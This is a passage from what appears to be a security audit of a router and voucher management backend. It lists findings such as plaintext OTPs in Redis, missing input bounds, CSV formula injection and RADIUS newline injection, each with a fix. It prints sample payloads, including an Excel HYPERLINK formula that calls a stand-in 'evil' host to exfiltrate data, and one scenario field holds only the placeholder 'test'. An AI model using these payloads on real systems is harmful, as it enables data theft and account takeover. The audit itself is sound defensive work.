**Concrete scenario.** An attacker who obtains Redis read access — a leaked RDB/AOF backup, a misconfigured/exposed Redis instance, or a snapshot in an insecure store — runs `KEYS otp:*` / `GET` and reads live plaintext reset, verify, and email-change codes. For any user with a pending password-reset OTP, the attacker submits that code to the reset endpoint and takes over the account; likewise completes email-change (newEmail is also stored plaintext alongside the code). No brute force or timing attack needed. This depends entirely on a prior Redis/backup compromise, so it is a defense-in-depth gap rather than a directly reachable bypass. The non-constant-time compare adds a theoretical timing channel but is neutralized by the 5-attempt destroy-on-lockout cap, so it yields no practical break.

**Suggested fix.** Store a hash of the OTP (e.g. HMAC-SHA256 with a server secret, or bcrypt/sha256) instead of the plaintext code, and compare using crypto.timingSafeEqual over fixed-length buffers. For email-change, keep newEmail plaintext but hash the code field. This removes plaintext codes from Redis and makes the compare constant-time in one change.

---

### GAP-5 — Auth-critical Redis has no pinned persistence or eviction policy (relies on defaults under a 256m cap)

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** availability-hardening
- **Location:** `docker-compose.yml:89`

**What it is.** Prod Redis is launched as `redis-server --requirepass "$REDIS_PASSWORD"` with no `--appendonly`, no `--save` override, no `--maxmemory`, and no `--maxmemory-policy`; grep of docker-compose.yml confirms none of these directives exist. It therefore runs on the redis:7 compiled defaults: RDB snapshotting only (save points 3600/1, 300/100, 60/10000), AOF off, and `noeviction`, while the container is capped at `mem_limit: 256m`. This Redis instance is the sole store for refresh-token jti keys (token.service.ts storeRefreshToken/consumeRefreshToken, 7d TTL) and OTP/rate-limit state, and config/redis.ts intentionally fails CLOSED for auth. Two consequences: (a) on an ungraceful restart or Docker OOM-kill, RDB-only persistence loses up to ~1h of refresh-token keys, forcing recently-issued sessions to re-login; (b) with `noeviction` under the 256m cap, if the keyspace ever fills, all writes (SET refresh key, OTP, INCR) return OOM errors — since the token store fails closed, every login and token rotation breaks platform-wide until memory is freed. Note: the rotation-replay INVARIANT is unaffected — consumeRefreshToken's `DEL` returns 0 on a missing key so a vanished/evicted jti fails closed to 401 REFRESH_TOKEN_REVOKED (auth.service.ts:156), never enabling replay.

**Impact.** Availability only, and self-inflicted: a Redis crash/OOM-restart forces mass re-login (fails closed, no security bypass), and memory exhaustion under the default noeviction policy would block all new logins/token rotations. No token-replay or authz bypass results because the missing-key branch fails closed.

**Concrete scenario.** Under sustained load the Redis keyspace (refresh jti keys with 7d TTL + OTP + rate-limit counters) grows toward the 256m mem_limit. With the default noeviction policy and no maxmemory set below the container cap, Redis is either OOM-killed by Docker or begins returning OOM errors on writes. Because token.service.ts and redis.ts fail closed, every SET refreshRefresh (issueTokenPair), OTP creation, and INCR then throws, so all new logins and refresh-token rotations fail platform-wide until memory is freed/Redis restarts. Separately, an ungraceful restart (OOM-kill) loses up to ~1h of RDB-unsnapshotted refresh keys, forcing recently-issued sessions to re-login. No token-replay or authz bypass occurs — consumeRefreshToken's DEL returns 0 on a missing key, yielding 401 REFRESH_TOKEN_REVOKED.

**Suggested fix.** Pin explicit directives on the prod redis command: `--maxmemory 200mb --maxmemory-policy noeviction` (keep noeviction so security state is never silently evicted, but set maxmemory below the 256m cap so Redis rejects writes gracefully instead of being OOM-killed) and `--appendonly yes` for durable recovery of refresh/lockout state across restarts. Consider alerting on Redis used_memory approaching maxmemory since fail-closed auth makes memory pressure an outage.

---

### INPUT-1 — GET /admin/support/conversations has no validate() — raw page/limit/search reach SQL

- **Severity:** Low (finder proposed Medium; verifiers recalibrated)  ·  **Verifier votes:** 3/3  ·  **Category:** input
- **Location:** `backend/src/routes/admin.routes.ts:166`

**What it is.** Every other admin list endpoint validates its query with a Zod schema, but /support/conversations is registered with no validate() middleware: `router.get('/support/conversations', supportController.listConversations);`. The controller (support.controller.ts:70-74) reads page, limit, search straight from req.query via Number(limit) || 20 and passes them to supportService.listConversations, which interpolates them as LIMIT $n OFFSET $n parameters (support.service.ts:150,173,192) and wraps search unescaped/unbounded into an ILIKE pattern.

**Impact.** ?limit=-5 survives Number(-5) || 20 and becomes LIMIT -5, which Postgres rejects ('LIMIT must not be negative') → unhandled pg error → 500 INTERNAL_ERROR + Sentry noise. ?limit=100000000 requests an unbounded page size (memory/latency), and search has no max length (a multi-KB ILIKE pattern per request). Admin-authenticated only, so blast radius is limited, but it breaks the API contract every other admin list enforces (limit ≤ 100).

**Concrete scenario.** test

**Suggested fix.** Add a query schema (reuse the shared paginationSchema pattern: page min 1, limit 1..100, search .max(100)) and register it: `router.get('/support/conversations', validate({ query: listConversationsQuerySchema }), supportController.listConversations);`. Have the controller read the coerced values instead of re-parsing with Number().

---

### INPUT-2 — createVouchersSchema limitValue has no upper bound and is not an integer — overflows BIGINT and 500s

- **Severity:** Low (finder proposed Medium; verifiers recalibrated)  ·  **Verifier votes:** 3/3  ·  **Category:** input
- **Location:** `backend/src/validators/voucher.validators.ts:16`

**What it is.** `limitValue: z.number().positive()` accepts any finite positive double (no .int(), no .max()). voucher.service normalizeLimit (voucher.service.ts:133-142) multiplies it by up to 1024^3 (GB) or 86400 (days), then String()s the result into radcheck values and inserts it into voucher_meta.limit_value, which is BIGINT (010_voucher_wizard.sql:7). Same file: `price: z.number().min(0)` with no max targets DECIMAL(10,2), and validitySeconds (min 0, no max) targets an INTEGER column. The same missing-upper-bound pattern exists admin-side (admin.validators.ts:125 price, :127 max_routers, :45 voucher_quota).

**Impact.** Any authenticated operator hitting POST /routers/:id/vouchers with e.g. {limitValue: 1e18, limitUnit: 'GB'} (out of BIGINT range), {limitValue: 0.7, limitUnit: 'minutes'} (→ '42.00000000000001', invalid bigint syntax), {price: 1e9} (numeric field overflow), or {validitySeconds: 3e9} (integer out of range) gets an unhandled pg insert error → 500 INTERNAL_ERROR instead of 400, rolls back the batch, and pollutes Sentry. Values that DO fit BIGINT but exceed 2^32 flow into radcheck Max-All-Session / Max-Total-Octets as nonsense limits FreeRADIUS will never enforce meaningfully.

**Concrete scenario.** An authenticated operator issues POST /routers/:id/vouchers with body {limitType:'data', limitValue:1e18, limitUnit:'GB', count:1, price:0}. Zod accepts it (no .max()/.int() on limitValue). normalizeLimit returns ~1.07e27, which the code inserts into voucher_meta.limit_value (BIGINT, max 9.22e18). Postgres raises 'bigint out of range', the create transaction rolls back, and the API returns 500 INTERNAL_ERROR instead of a 400 validation error, emitting a Sentry event. The same 500 path is reachable via {price:1e9} (DECIMAL(10,2) numeric field overflow), {validitySeconds:3e9} (INTEGER out of range), or {limitValue:0.7, limitUnit:'GB'} (non-integer into BIGINT).

**Suggested fix.** Constrain in the schema: `limitValue: z.number().int().positive().max(1_000_000)` (or a per-unit refine so normalized seconds/bytes stay ≤ 2^63-1 and time limits ≤ ~10 years), `price: z.number().min(0).max(99_999_999.99)`, `validitySeconds: z.number().int().min(0).max(10 * 365 * 86400)`. Apply matching .max() bounds to the admin plan/subscription numeric fields.

---

### INPUT-4 — Crafted pagination cursor with well-formed JSON but invalid UUID/timestamp/bigint causes 500 instead of 422

- **Severity:** Low  ·  **Verifier votes:** 2/3  ·  **Category:** input
- **Location:** `backend/src/services/voucher.service.ts:781`

**What it is.** decodeCursor only throws INVALID_CURSOR for malformed base64/JSON (utils/cursor.ts:37-44); field values are not type-checked beyond truthiness. The callers then bind the decoded strings straight into server-side casts: voucher.service.ts:766-784 ($n::timestamptz / $n::uuid), inbox.service.ts:83-101, and session.service.ts:301-316 ($n::bigint). A cursor like base64url('{"createdAt":"x","id":"y"}') passes every guard, then Postgres raises 22P02/22007 ('invalid input syntax'), which is not an AppError, so errorHandler returns 500 INTERNAL_ERROR and captures the event to Sentry (errorHandler.ts:44-59).

**Impact.** Any authenticated user can trigger arbitrary 500s (and Sentry error noise / alert fatigue) on the voucher list, notification inbox, support-message, and session-history endpoints by sending a trivially crafted cursor query param. Legitimate clients that persist cursors across schema changes hit the same 500 instead of the intended 422 INVALID_CURSOR contract. No data exposure — parameters remain bound.

**Concrete scenario.** An authenticated user who owns a router requests GET .../vouchers?cursor=<base64url of {"createdAt":"x","id":"y"}>. verifyRouterOwnership passes, decodeCursor returns the object, the truthiness guard passes, and "x" is bound to $n::timestamptz. Postgres raises 22007 'invalid input syntax for type timestamp'. That error is not an AppError, so the client receives 500 INTERNAL_ERROR (not 422 INVALID_CURSOR) and a Sentry exception is captured. Repeating the request generates arbitrary 500s and Sentry/alert noise; the session-history endpoint fails identically via ::bigint on the id field.

**Suggested fix.** Validate decoded cursor payloads with a small Zod schema (ISO datetime via Date.parse, UUID regex, Number.isSafeInteger for radacctid) and throw the existing 422 INVALID_CURSOR on failure; alternatively catch pg error code 22P02 around cursor-mode queries and map it to 422.

---

### INPUT-5 — CSV export does not escape embedded quotes or formula prefixes in user-controlled names

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** input
- **Location:** `backend/src/services/report.service.ts:520`

**What it is.** exportReportCsv wraps profileName/groupName/routerName in double quotes but never escapes double quotes inside the value (`"${r.profileName}"` at line 520, `"${r.routerName}"` at line 530), and no field is guarded against spreadsheet formula prefixes (=, +, -, @). radius_profiles.display_name and routers.name are free-text values set by the operator.

**Impact.** A profile named `My " Profile` produces structurally broken CSV (columns shift for that row and rows after it). A name beginning with `=` (e.g. `=HYPERLINK(...)` or `=cmd|...`) executes as a formula when the exported report is opened in Excel/LibreOffice — CSV injection. Blast radius is limited because the exporter is the same operator who named the entities (self-injection), but exports shared with accountants/staff carry the payload onward.

**Concrete scenario.** Operator names a router `=HYPERLINK("http://evil/"&A1,"click")` (or a profile `My " Profile`). They export the router-uptime/revenue report as CSV and email it to an accountant. The accountant opens it in Excel: the quote-containing name shifts columns for that and following rows; the `=` name evaluates as a formula, enabling data exfiltration via HYPERLINK/WEBSERVICE or command execution via DDE prompts.

**Suggested fix.** Add a csvEscape helper: double internal quotes (value.replace(/"/g, '""')), always quote, and prefix values starting with =, +, -, @ with a single quote (or tab) before quoting. Apply it to every free-text field in all four export branches.

---

### INPUT-6 — register/createAdmin email lacks max(255) — over-length valid emails 500 on VARCHAR(255) insert

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** input
- **Location:** `backend/src/validators/auth.validators.ts:14`

**What it is.** registerSchema uses `email: z.string().email('Invalid email address')` with no .max(). Zod 4's email pattern does not cap total length, so a syntactically valid 300+ character email passes validation, but users.email is VARCHAR(255) (003_application_tables.sql:22). The insert fails with 'value too long for type character varying(255)' → unhandled pg error → 500 INTERNAL_ERROR on the unauthenticated /auth/register endpoint. Same gap in createAdminSchema (settings.validators.ts:21) and loginSchema/forgotPasswordSchema. Notably changeEmailSchema (auth.validators.ts:88-92) already applies .max(255) — the bound exists in one place but not the others.

**Impact.** Unauthenticated requester can deterministically trigger 500s (and Sentry captures) on /auth/register with a crafted long email; legitimate long-address users get an opaque 'Internal server error' instead of a 400 VALIDATION_ERROR. No data corruption (insert rejects atomically).

**Concrete scenario.** An unauthenticated client POSTs /auth/register with a valid-format email whose local part makes the total length >255 chars (e.g. 260 'a's + '@example.com'). Zod validation passes; auth.service.register runs the INSERT into users(email VARCHAR(255)), which raises pg error 22001 'value too long for type character varying(255)'. Not an AppError, so the global handler returns 500 INTERNAL_ERROR (and captures a Sentry event) rather than a 400 VALIDATION_ERROR. Deterministically repeatable; no data corruption or process crash.

**Suggested fix.** Define one shared `emailSchema = z.string().email().max(255).transform(e => e.trim().toLowerCase())` and use it in registerSchema, loginSchema, forgotPassword/resetPassword/verifyEmail/resendVerification and createAdminSchema.

---

### INPUT-7 — Password schemas have no maximum length (bcrypt 72-byte truncation, megabyte inputs accepted)

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** input
- **Location:** `backend/src/validators/auth.validators.ts:3`

**What it is.** passwordSchema (min 8, uppercase, digit — lines 3-7) and its twin in settings.validators.ts:3-7 impose no .max(). Register/reset/change-password therefore accept passwords up to the 10MB JSON body limit. bcrypt only hashes the first 72 bytes, so everything beyond byte 72 is silently discarded: two different multi-hundred-character passwords sharing a 72-byte prefix are interchangeable at login, and the user believes their full passphrase is significant.

**Impact.** Contract/hardening issue: silent 72-byte truncation weakens user expectations (a compromised 72-byte prefix suffices), and megabyte-sized password fields are needlessly parsed and shipped to bcrypt on the unauthenticated register/reset paths. No practical CPU DoS (bcrypt cost is length-independent).

**Concrete scenario.** A user registers with a 200-character passphrase whose first 72 bytes are "Correct-Horse-Battery-Staple-...". An attacker who learns only that 72-byte prefix (e.g. from a shoulder-surf or a partial leak) can log in by submitting just the prefix plus any arbitrary trailing bytes, because bcrypt.compare only ever considered the first 72 bytes at hash time. The user has no indication the rest of their passphrase was discarded.

**Suggested fix.** Add `.max(128)` (well under bcrypt's 72-byte significant length for ASCII, generous for passphrases) to both passwordSchema definitions, and reject rather than truncate.

---

### INPUT-8 — Device push token accepted with no length cap into TEXT column

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** input
- **Location:** `backend/src/validators/notification.validators.ts:4`

**What it is.** registerDeviceTokenSchema is `token: z.string().min(1)` with no .max() (unregister likewise, line 9), and device_tokens.token is unbounded TEXT with UNIQUE(user_id, token) (005_device_tokens.sql:5,9). Real FCM/APNs tokens are <200 chars; nothing enforces that.

**Impact.** An authenticated user can POST /notifications/device-token repeatedly with distinct multi-megabyte 'tokens' (up to the 10MB body limit); each is a new row due to the UNIQUE pair, bloating the table and every downstream push-fanout query that loads tokens. Storage/DoS-under-load hardening rather than an exploit.

**Concrete scenario.** An authenticated user scripts repeated POST /notifications/device-token with distinct near-body-limit 'token' strings (each unique, so ON CONFLICT never fires). Each request appends a multi-megabyte row to device_tokens; the table grows unboundedly per user, and every downstream getTokensForUser fanout query for that user loads all the oversized rows, degrading push delivery and consuming storage.

**Suggested fix.** Add `.max(512)` to token in both register and unregister schemas (FCM tokens are ~160-200 chars; APNs 64-160 hex), and optionally cap device_tokens rows per user in the service.

---

### PAY-4 — reviewPayment approves a payment even when no pending subscription exists to activate

- **Severity:** Low  ·  **Verifier votes:** 2/3  ·  **Category:** payments
- **Location:** `backend/src/services/admin.service.ts:759`

**What it is.** In the approval branch, if neither a 'pending_change' nor a 'pending' subscription row is found for the payer, reviewPayment silently proceeds: the payment is marked 'approved' and COMMITted, the user gets a 'payment confirmed' push/email, but no subscription is activated and no error or warning is raised (the `if (pendingSub.rows.length > 0)` at line 759 has no else).

**Impact.** Reachable when the user cancels the payment/subscription concurrently with admin review (cancelPayment cancels the pending subscription; the racing approval — see PAY-1 — can still land), or when an admin has deleted/updated the subscription row. Result: money recorded as approved revenue with no service activated, and the customer is told their payment was confirmed. The mismatch is invisible until the user complains, and there is no log line flagging it.

**Concrete scenario.** Admin deletes (deleteSubscription, admin.service.ts:455) or updates the status of a user's pending subscription so no 'pending'/'pending_change' row remains, while the user's payment (with an uploaded receipt) is still 'pending'. Admin then approves that payment. reviewPayment UPDATEs the payment to 'approved' (rowCount 1, passes the status='pending' AND receipt_url IS NOT NULL guard), finds no pending_change and no pending subscription, skips activation entirely (line 759 has no else), COMMITs, and fires notifyPaymentConfirmed + sendPaymentApproved. Result: revenue recorded as approved, customer told their payment is confirmed, but no subscription is active and no log line flags the mismatch — silent inconsistency until the user complains.

**Suggested fix.** When decision is 'approved' and no pending/pending_change subscription is found, either throw (rolling back the approval) with a distinct error code like NO_SUBSCRIPTION_TO_ACTIVATE, or at minimum log at error level and surface the anomaly in the admin response so the operator can reconcile.

---

### RADIUS-1 — validityCoaDisconnect job forwards radacct acctsessionid to radclient without the isSafeAcctSessionId guard used on the other two CoA paths

- **Severity:** Low (finder proposed Medium; verifiers recalibrated)  ·  **Verifier votes:** 2/3  ·  **Category:** radius
- **Location:** `backend/src/jobs/validityCoaDisconnect.ts:56`

**What it is.** Both other CoA call sites validate acctsessionid before passing it to radclient stdin: session.service.ts:167 and voucher.service.ts:1228 call isSafeAcctSessionId with explicit comments that radacct is attacker-influenced. The 30-second validityCoaDisconnect cron takes acctsessionid straight from its radacct query and calls sendDisconnectRequest (lines 56-62) with no such check. radclient.service.ts only escapes double quotes (sid.replace(/"/g, '\\"'), line 192) — embedded newlines or commas in the value are written raw to radclient stdin (line 198 parts.join(',') + '\n'), where a newline terminates the request line and starts a second attribute list.

**Impact.** A rogue or compromised router (an operator's own device, which writes radacct via RADIUS accounting) can craft an Acct-Session-Id containing commas/newlines that, when the cron fires for an expired voucher on that NAS, injects extra RADIUS attributes or additional Disconnect-Request packets into the radclient session. Blast radius is limited (target address and secret are fixed to that same NAS from argv), so this is a defense-in-depth gap rather than an exploit — but it is exactly the scenario the project's own guard exists for, and this path skips it.

**Concrete scenario.** An operator's compromised/malicious router sends RADIUS accounting with Acct-Session-Id containing an embedded newline (e.g. `abc\nUser-Name="x",NAS-IP-Address=...`), stored in radacct. When a voucher on that NAS expires while its session is active, the 30s cron pulls the row and calls sendDisconnectRequest without isSafeAcctSessionId; radclient.service.ts escapes only quotes, so the newline is written raw to radclient stdin, causing radclient to parse a second injected request/attribute line. Impact is limited to extra attributes/packets against that same router (fixed nasIp+secret from argv); no cross-tenant reach, disclosure, or process crash — a defense-in-depth gap the project's own guard was written to close.

**Suggested fix.** Import isSafeAcctSessionId from utils/radius and skip-with-warning any row whose acctsessionid (and username) fails the ^[A-Za-z0-9._-]+$ check, mirroring voucher.service.ts:1228-1235. Optionally harden radclient.service.ts itself to reject values containing \r/\n/, before writing to stdin so no future caller can bypass the guard.

---

## Considered and cleared (not defects)

These candidates were investigated and did **not** survive verification — recorded so the check is visible:

- **All rate limiters fail open on Redis store errors** (`backend/src/middleware/rateLimiter.ts:26`, 0/3 confirmed) — The finding's mechanism depends on the code comment's claim that express-rate-limit treats a store rejection as "skip" (fail open). I verified this against the installed library. express-rate-limit v8.3.1 (node_modules/express-rate-limit/dist/index.cjs:853-867) catches the store error and only calls next() to allow the request when config.passOnStoreError is TRUE; otherwise it re-throws, which handleAsyncErrors forwards to next(error) → Express error handler → 500. The library default is passOnStoreError: false (line 808), and none of generalLimiter/authLimiter/adminEmailLimiter in rateLimiter.ts sets it. So when makeRedisSendCommand throws (rateLimiter.ts:26) during a Redis outage, RedisStore.increment rejects and the limiter FAILS CLOSED (500), not open. The claimed outcome — unthrottled throughput, cross-account bcrypt hammering, uncapped email endpoints — cannot occur. The JSDoc/comment ("failing open") is inaccurate for the pinned version, but the described security defect is not present in actual runtime behavior. Remaining issue is only a minor availability quirk (blanket 500s while Redis is down), and auth/OTP flows already hard-depend on Redis anyway — not the reported bypass.
- **redact() sensitive-key regex misses common secret key shapes** (`backend/src/utils/redact.ts:5`, 1/3 confirmed) — The regex claim is factually correct (redact.ts:5 misses camelCase/generic secret names), but I audited all redact() call sites and none carries a secret that would leak today. The five body-redacting paths (admin.controller updateUser/updateSubscription/createPlan/updatePlan at lines 184/226/262/276, and settings.controller updateBankSettings at line 51) contain only user fields, subscription/plan metadata, and explicitly-non-secret bank.* fields. updateUser's password field IS matched by the regex. Real secrets (api_pass_enc, wg_private_key_enc, wg_preshared_key_enc, radius_secret_enc) never pass through these admin endpoints — router/WG material is server-generated or handled elsewhere. All paths are admin-only (router.use(authenticate, requireAdmin)). The finding concedes "No live leak found." It is a genuine but unreachable defense-in-depth/hardening gap contingent on a future endpoint, not a live consequence any actor can trigger, so it does not meet the confirm bar; true level is Low.
- **requestSubscription check-then-insert race allows duplicate pending/active subscriptions; reviewPayment activates 'latest pending' without matching the paid tier** (`backend/src/services/subscription.service.ts:227`, 1/3 confirmed) — Verified in real code. subscription.service.ts:227-240 enforces the single-subscription invariant with an unlocked SELECT executed outside the insert transaction (INSERTs at 255-271); the only index is the non-unique idx_subscriptions_user_id (migrations/sql/003_application_tables.sql:50) — no partial unique index exists. Because the SELECT is awaited, two concurrent POST /subscription/request calls both observe zero rows and both INSERT, producing two 'pending' subscriptions for one user. The route (subscription.routes.ts:25-30) is behind authenticate only, so any normal authenticated user reaches it and controls planTier/durationMonths. admin.service.ts:751-768 then activates the newest pending subscription by created_at DESC with no plan_tier = payment.plan_tier predicate, so approving the paid (cheap) payment can activate the unpaid higher-tier subscription. Impact is a genuine tier/quota-enforcement and revenue bypass (enterprise -1 unlimited quota), but it requires winning a check-then-insert race and an admin approval action, and the resulting tier depends on insert ordering — more than defense-in-depth, less than an unconditional bypass. Medium is correct.
- **Incomplete and inconsistent escaping of untrusted values written to radclient stdin (username/framedIp not whitelist-guarded)** (`backend/src/services/radclient.service.ts:189`, 1/3 confirmed) — The code matches the finding exactly. In backend/src/services/radclient.service.ts:189, User-Name is only double-quote-escaped (`username.replace(/"/g, '\\"')`) — backslash, comma, and CR/LF are NOT neutralized. Framed-IP-Address (line 196) is pushed with no quoting or validation. The whole line is `parts.join(',') + '\n'` written to radclient stdin (line 198), and radclient reads one request per line, so an embedded newline in username or framedIp appends an extra request line. The asymmetry is real: acctSessionId is guarded by isSafeAcctSessionId (^[A-Za-z0-9._-]+$, utils/radius.ts:3) at both call sites (session.service.ts:167, voucher.service.ts:1228), but username and framedIp pass through no isSafe* guard on any path. Attacker-controllability is genuine on the session.service.disconnectSession path: username is the return of disconnectHotspotUser() = `session.user` from the RouterOS /ip/hotspot/active `user` field (routerOs.service.ts:333), which a malicious operator controls via their own router/API responder behind their tunnel IP. The radacct `WHERE username=$2` lookup (session.service.ts:156) can be satisfied because that same operator can emit an Accounting-Request from their own NAS with a matching crafted User-Name, so the row exists. framedipaddress is also read straight from radacct (operator-writable via accounting) and forwarded unquoted on all three paths. So the injection is reachable. However blast radius is severely limited: radclient's destination `${nasIp}:${port}` and shared secret are fixed argv, so every injected line still targets only the operator's OWN NAS with the operator's OWN secret — no cross-tenant reach and nothing the operator couldn't already send to their own router directly. spawn is used with no shell (no RCE), and a malformed line only makes the separate radclient process error, not the backend (no crash/DoS). This is a real but purely defense-in-depth / consistency gap that crosses no security boundary, so Low is the correct calibrated severity.

Additional note on the rate limiter: the store re-throws on Redis error, and **express-rate-limit 8.3.1 surfaces a store rejection as a request error (HTTP 500), i.e. it fails _closed_, not open** — so a Redis outage degrades availability but does not bypass rate limiting. The in-code comment claiming "fails open / treats store rejection as skip" is misleading and should be corrected.

---

## Fix priority (if you proceed to remediation)

1. **GAP-1 `trust proxy`** — one line (`app.set('trust proxy', 1)`), but it changes `req.ip` semantics for both rate limiting and audit-log IP capture (GAP-2); fix them together and confirm the Nginx hop count.
2. **GAP-7 / notification preferences array caps, INPUT-2 voucher `limitValue`, INPUT-6/7/8 length caps** — cheap Zod `.max()` / `.int()` additions closing DoS and 500-on-overflow paths.
3. **SQL-1 migration timeout & SQL-2 quota decrement & PAY-1 status-guarded payment updates** — data-integrity fixes; SQL-1 should land before the next production index migration.
4. **CODE-1/CODE-2 RouterOS key casing** — correctness bugs already degrading router health reporting in production; align with the `routeros-client key transform` memory.
5. The remaining Low items are hardening/quality — batch at leisure.

All fixes must follow the staging gate in `CLAUDE.md` (dev → staging VPS → validate → `main`); prod is live with paying users. **No code was changed by this audit.**
